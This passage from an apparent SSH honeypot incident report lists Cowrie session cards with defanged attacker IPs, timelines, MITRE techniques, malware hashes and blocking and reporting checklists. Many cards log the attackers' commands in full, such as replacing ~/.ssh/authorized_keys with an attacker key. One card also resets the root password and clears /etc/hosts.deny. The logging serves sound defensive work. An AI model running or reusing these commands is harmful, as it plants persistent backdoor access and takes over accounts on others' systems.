| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:05:19` | `cowrie.session.connect` |
| `2026-04-17 09:05:19` | `cowrie.client.version` |
| `2026-04-17 09:05:19` | `cowrie.client.kex` |
| `2026-04-17 09:05:20` | `cowrie.login.success` |
| `2026-04-17 09:05:21` | `cowrie.session.params` |
| `2026-04-17 09:05:21` | `cowrie.command.input` |
| `2026-04-17 09:05:21` | `cowrie.command.failed` |
| `2026-04-17 09:05:21` | `cowrie.log.closed` |
| `2026-04-17 09:05:21` | `cowrie.session.params` |
| `2026-04-17 09:05:21` | `cowrie.command.input` |
| `2026-04-17 09:05:21` | `cowrie.session.file_download` |
| `2026-04-17 09:05:21` | `cowrie.log.closed` |
| `2026-04-17 09:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]146` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f63b055af8

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]146` |
| **First Seen** | 2026-04-17 09:05 |
| **Last Seen** | 2026-04-17 09:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:05:29` | `cowrie.session.connect` |
| `2026-04-17 09:05:29` | `cowrie.client.version` |
| `2026-04-17 09:05:29` | `cowrie.client.kex` |
| `2026-04-17 09:05:30` | `cowrie.login.success` |
| `2026-04-17 09:05:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]146` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da274e8fb1e2

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:06 |
| **Last Seen** | 2026-04-17 09:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:06:47` | `cowrie.session.connect` |
| `2026-04-17 09:06:47` | `cowrie.client.version` |
| `2026-04-17 09:06:48` | `cowrie.client.kex` |
| `2026-04-17 09:06:48` | `cowrie.login.success` |
| `2026-04-17 09:06:48` | `cowrie.session.params` |
| `2026-04-17 09:06:48` | `cowrie.command.input` |
| `2026-04-17 09:06:48` | `cowrie.command.failed` |
| `2026-04-17 09:06:49` | `cowrie.log.closed` |
| `2026-04-17 09:06:49` | `cowrie.session.params` |
| `2026-04-17 09:06:49` | `cowrie.command.input` |
| `2026-04-17 09:06:49` | `cowrie.session.file_download` |
| `2026-04-17 09:06:49` | `cowrie.log.closed` |
| `2026-04-17 09:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acb192cb25fd

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:06 |
| **Last Seen** | 2026-04-17 09:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:06:51` | `cowrie.session.connect` |
| `2026-04-17 09:06:51` | `cowrie.client.version` |
| `2026-04-17 09:06:51` | `cowrie.client.kex` |
| `2026-04-17 09:06:52` | `cowrie.login.success` |
| `2026-04-17 09:06:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eff6b6e09067

| Field | Detail |
|---|---|
| **Source IP** | `119.96.157[.]188` |
| **First Seen** | 2026-04-17 09:08 |
| **Last Seen** | 2026-04-17 09:08 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:b5HspEeaz3Vg"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:08:18` | `cowrie.session.connect` |
| `2026-04-17 09:08:18` | `cowrie.client.version` |
| `2026-04-17 09:08:18` | `cowrie.client.kex` |
| `2026-04-17 09:08:20` | `cowrie.login.success` |
| `2026-04-17 09:08:21` | `cowrie.session.params` |
| `2026-04-17 09:08:21` | `cowrie.command.input` |
| `2026-04-17 09:08:21` | `cowrie.command.failed` |
| `2026-04-17 09:08:22` | `cowrie.log.closed` |
| `2026-04-17 09:08:22` | `cowrie.session.params` |
| `2026-04-17 09:08:22` | `cowrie.command.input` |
| `2026-04-17 09:08:22` | `cowrie.session.file_download` |
| `2026-04-17 09:08:22` | `cowrie.log.closed` |
| `2026-04-17 09:08:35` | `cowrie.session.params` |
| `2026-04-17 09:08:35` | `cowrie.command.input` |
| `2026-04-17 09:08:35` | `cowrie.log.closed` |
| `2026-04-17 09:08:36` | `cowrie.session.params` |
| `2026-04-17 09:08:36` | `cowrie.command.input` |
| `2026-04-17 09:08:36` | `cowrie.log.closed` |
| `2026-04-17 09:08:37` | `cowrie.session.params` |
| `2026-04-17 09:08:37` | `cowrie.command.input` |
| `2026-04-17 09:08:37` | `cowrie.session.file_download` |
| `2026-04-17 09:08:37` | `cowrie.log.closed` |
| `2026-04-17 09:08:37` | `cowrie.session.params` |
| `2026-04-17 09:08:37` | `cowrie.command.input` |
| `2026-04-17 09:08:37` | `cowrie.log.closed` |
| `2026-04-17 09:08:38` | `cowrie.session.params` |
| `2026-04-17 09:08:38` | `cowrie.command.input` |
| `2026-04-17 09:08:38` | `cowrie.log.closed` |
| `2026-04-17 09:08:38` | `cowrie.session.params` |
| `2026-04-17 09:08:38` | `cowrie.command.input` |
| `2026-04-17 09:08:38` | `cowrie.command.input` |
| `2026-04-17 09:08:38` | `cowrie.log.closed` |
| `2026-04-17 09:08:39` | `cowrie.session.params` |
| `2026-04-17 09:08:39` | `cowrie.command.input` |
| `2026-04-17 09:08:39` | `cowrie.log.closed` |
| `2026-04-17 09:08:39` | `cowrie.session.params` |
| `2026-04-17 09:08:39` | `cowrie.command.input` |
| `2026-04-17 09:08:39` | `cowrie.log.closed` |
| `2026-04-17 09:08:40` | `cowrie.session.params` |
| `2026-04-17 09:08:40` | `cowrie.command.input` |
| `2026-04-17 09:08:40` | `cowrie.log.closed` |
| `2026-04-17 09:08:40` | `cowrie.session.params` |
| `2026-04-17 09:08:40` | `cowrie.command.input` |
| `2026-04-17 09:08:40` | `cowrie.log.closed` |
| `2026-04-17 09:08:41` | `cowrie.session.params` |
| `2026-04-17 09:08:41` | `cowrie.command.input` |
| `2026-04-17 09:08:41` | `cowrie.log.closed` |
| `2026-04-17 09:08:41` | `cowrie.session.params` |
| `2026-04-17 09:08:41` | `cowrie.command.input` |
| `2026-04-17 09:08:41` | `cowrie.log.closed` |
| `2026-04-17 09:08:42` | `cowrie.session.params` |
| `2026-04-17 09:08:42` | `cowrie.command.input` |
| `2026-04-17 09:08:42` | `cowrie.log.closed` |
| `2026-04-17 09:08:42` | `cowrie.session.params` |
| `2026-04-17 09:08:42` | `cowrie.command.input` |
| `2026-04-17 09:08:43` | `cowrie.log.closed` |
| `2026-04-17 09:08:43` | `cowrie.session.params` |
| `2026-04-17 09:08:43` | `cowrie.command.input` |
| `2026-04-17 09:08:43` | `cowrie.log.closed` |
| `2026-04-17 09:08:43` | `cowrie.session.params` |
| `2026-04-17 09:08:43` | `cowrie.command.input` |
| `2026-04-17 09:08:44` | `cowrie.log.closed` |
| `2026-04-17 09:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.157[.]188` to AbuseIPDB if not already reported
- [ ] Block `119.96.157[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e07d5b54b986

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:08 |
| **Last Seen** | 2026-04-17 09:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:08:26` | `cowrie.session.connect` |
| `2026-04-17 09:08:26` | `cowrie.client.version` |
| `2026-04-17 09:08:26` | `cowrie.client.kex` |
| `2026-04-17 09:08:26` | `cowrie.login.success` |
| `2026-04-17 09:08:27` | `cowrie.session.params` |
| `2026-04-17 09:08:27` | `cowrie.command.input` |
| `2026-04-17 09:08:27` | `cowrie.command.failed` |
| `2026-04-17 09:08:27` | `cowrie.log.closed` |
| `2026-04-17 09:08:27` | `cowrie.session.params` |
| `2026-04-17 09:08:27` | `cowrie.command.input` |
| `2026-04-17 09:08:27` | `cowrie.session.file_download` |
| `2026-04-17 09:08:27` | `cowrie.log.closed` |
| `2026-04-17 09:08:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f2c7018d267

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:08 |
| **Last Seen** | 2026-04-17 09:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:08:29` | `cowrie.session.connect` |
| `2026-04-17 09:08:29` | `cowrie.client.version` |
| `2026-04-17 09:08:29` | `cowrie.client.kex` |
| `2026-04-17 09:08:30` | `cowrie.login.success` |
| `2026-04-17 09:08:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0bb806cd3b3

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:09 |
| **Last Seen** | 2026-04-17 09:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:09:08` | `cowrie.session.connect` |
| `2026-04-17 09:09:08` | `cowrie.client.version` |
| `2026-04-17 09:09:09` | `cowrie.client.kex` |
| `2026-04-17 09:09:09` | `cowrie.login.success` |
| `2026-04-17 09:09:10` | `cowrie.session.params` |
| `2026-04-17 09:09:10` | `cowrie.command.input` |
| `2026-04-17 09:09:10` | `cowrie.command.failed` |
| `2026-04-17 09:09:10` | `cowrie.log.closed` |
| `2026-04-17 09:09:10` | `cowrie.session.params` |
| `2026-04-17 09:09:10` | `cowrie.command.input` |
| `2026-04-17 09:09:10` | `cowrie.session.file_download` |
| `2026-04-17 09:09:10` | `cowrie.log.closed` |
| `2026-04-17 09:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e467927ddcf

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:09 |
| **Last Seen** | 2026-04-17 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:09:13` | `cowrie.session.connect` |
| `2026-04-17 09:09:13` | `cowrie.client.version` |
| `2026-04-17 09:09:13` | `cowrie.client.kex` |
| `2026-04-17 09:09:14` | `cowrie.login.success` |
| `2026-04-17 09:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff53e34acfd7

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:09 |
| **Last Seen** | 2026-04-17 09:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:09:47` | `cowrie.session.connect` |
| `2026-04-17 09:09:47` | `cowrie.client.version` |
| `2026-04-17 09:09:47` | `cowrie.client.kex` |
| `2026-04-17 09:09:47` | `cowrie.login.success` |
| `2026-04-17 09:09:48` | `cowrie.session.params` |
| `2026-04-17 09:09:48` | `cowrie.command.input` |
| `2026-04-17 09:09:48` | `cowrie.command.failed` |
| `2026-04-17 09:09:48` | `cowrie.log.closed` |
| `2026-04-17 09:09:48` | `cowrie.session.params` |
| `2026-04-17 09:09:48` | `cowrie.command.input` |
| `2026-04-17 09:09:48` | `cowrie.session.file_download` |
| `2026-04-17 09:09:48` | `cowrie.log.closed` |
| `2026-04-17 09:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09261d6dfa31

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:09 |
| **Last Seen** | 2026-04-17 09:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:09:53` | `cowrie.session.connect` |
| `2026-04-17 09:09:53` | `cowrie.client.version` |
| `2026-04-17 09:09:54` | `cowrie.client.kex` |
| `2026-04-17 09:09:54` | `cowrie.login.success` |
| `2026-04-17 09:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fe96b4b5eb9

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:10 |
| **Last Seen** | 2026-04-17 09:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:10:26` | `cowrie.session.connect` |
| `2026-04-17 09:10:26` | `cowrie.client.version` |
| `2026-04-17 09:10:26` | `cowrie.client.kex` |
| `2026-04-17 09:10:27` | `cowrie.login.success` |
| `2026-04-17 09:10:27` | `cowrie.session.params` |
| `2026-04-17 09:10:27` | `cowrie.command.input` |
| `2026-04-17 09:10:27` | `cowrie.command.failed` |
| `2026-04-17 09:10:28` | `cowrie.log.closed` |
| `2026-04-17 09:10:28` | `cowrie.session.params` |
| `2026-04-17 09:10:28` | `cowrie.command.input` |
| `2026-04-17 09:10:28` | `cowrie.session.file_download` |
| `2026-04-17 09:10:28` | `cowrie.log.closed` |
| `2026-04-17 09:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0cd0662d205

| Field | Detail |
|---|---|
| **Source IP** | `103.234.53[.]69` |
| **First Seen** | 2026-04-17 09:10 |
| **Last Seen** | 2026-04-17 09:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:10:31` | `cowrie.session.connect` |
| `2026-04-17 09:10:31` | `cowrie.client.version` |
| `2026-04-17 09:10:31` | `cowrie.client.kex` |
| `2026-04-17 09:10:32` | `cowrie.login.success` |
| `2026-04-17 09:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.234.53[.]69` to AbuseIPDB if not already reported
- [ ] Block `103.234.53[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-764f52f5e42d

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:10 |
| **Last Seen** | 2026-04-17 09:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:10:36` | `cowrie.session.connect` |
| `2026-04-17 09:10:36` | `cowrie.client.version` |
| `2026-04-17 09:10:36` | `cowrie.client.kex` |
| `2026-04-17 09:10:36` | `cowrie.login.success` |
| `2026-04-17 09:10:37` | `cowrie.session.params` |
| `2026-04-17 09:10:37` | `cowrie.command.input` |
| `2026-04-17 09:10:37` | `cowrie.command.failed` |
| `2026-04-17 09:10:37` | `cowrie.log.closed` |
| `2026-04-17 09:10:37` | `cowrie.session.params` |
| `2026-04-17 09:10:37` | `cowrie.command.input` |
| `2026-04-17 09:10:37` | `cowrie.session.file_download` |
| `2026-04-17 09:10:37` | `cowrie.log.closed` |
| `2026-04-17 09:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.48.24[.]181` to AbuseIPDB if not already reported
- [ ] Block `93.48.24[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d497b0204e0

| Field | Detail |
|---|---|
| **Source IP** | `93.48.24[.]181` |
| **First Seen** | 2026-04-17 09:10 |
| **Last Seen** | 2026-04-17 09:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
